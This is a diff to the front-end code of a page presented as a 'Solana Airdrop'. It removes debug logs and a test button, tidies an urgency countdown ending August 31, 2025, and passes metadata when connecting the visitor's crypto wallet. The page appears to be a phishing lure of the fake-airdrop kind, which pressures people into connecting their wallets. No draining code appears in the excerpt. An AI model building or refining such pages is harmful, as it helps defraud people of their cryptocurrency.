@@ -535,12 +535,10 @@
   </nav>
   <section class="hero" id="hero">
     <div class="hero-content">
-      <img src="/logos/logo.png" alt="Solana Logo" class="hero-logo" />
       <h1>🎁 Solana Airdrop</h1>
       <p class="hero-subtitle">Claim your exclusive $SOL tokens before August 31st!</p>
       <div class="countdown" id="countdown">Loading...</div>
-      <button class="claim-btn" onclick="console.log('Claim button clicked'); openWalletModal();">🎁 Claim Now</button>
-      <button onclick="console.log('Test countdown'); updateCountdown();" style="background:#333;color:#fff;border:none;padding:10px 20px;border-radius:10px;margin-top:10px;cursor:pointer;">Test Countdown</button>
+      <button class="claim-btn" onclick="openWalletModal();">🎁 Claim Now</button>
     </div>
   </section>
   <section id="security" class="info-section">
@@ -868,33 +866,18 @@
 
     // Countdown functionality
     function updateCountdown() {
-      console.log('updateCountdown function called');
       const now = new Date();
       const targetDate = new Date('August 31, 2025 23:59:59');
       const timeLeft = targetDate - now;
-      
-      console.log('Countdown calculation:', { now, targetDate, timeLeft });
-      
       if (timeLeft <= 0) {
         document.getElementById('countdown').innerHTML = 'Airdrop Closed';
         return;
       }
-      
       const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
       const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
       const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
       const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
-      
-      const countdownText = `${days}d ${hours}h ${minutes}m ${seconds}s`;
-      console.log('Countdown text:', countdownText);
-      
-      const countdownElement = document.getElementById('countdown');
-      if (countdownElement) {
-        countdownElement.innerHTML = countdownText;
-        console.log('Countdown updated successfully');
-      } else {
-        console.error('Countdown element not found!');
-      }
+      document.getElementById('countdown').innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;
     }
 
     // Update countdown every second
@@ -902,7 +885,6 @@
     updateCountdown(); // Initial call
 
     // Use the window.dAppMetadata that was set earlier
-    const dAppMetadata = window.dAppMetadata;
 
     // DOM Ready - Initialize everything after DOM is loaded
     document.addEventListener('DOMContentLoaded', function() {
@@ -989,7 +971,7 @@
             try {
               result = await provider.connect({
                 onlyIfTrusted: false,
-                appMetadata: dAppMetadata
+                appMetadata: window.dAppMetadata
               });
             } catch (error2) {
               
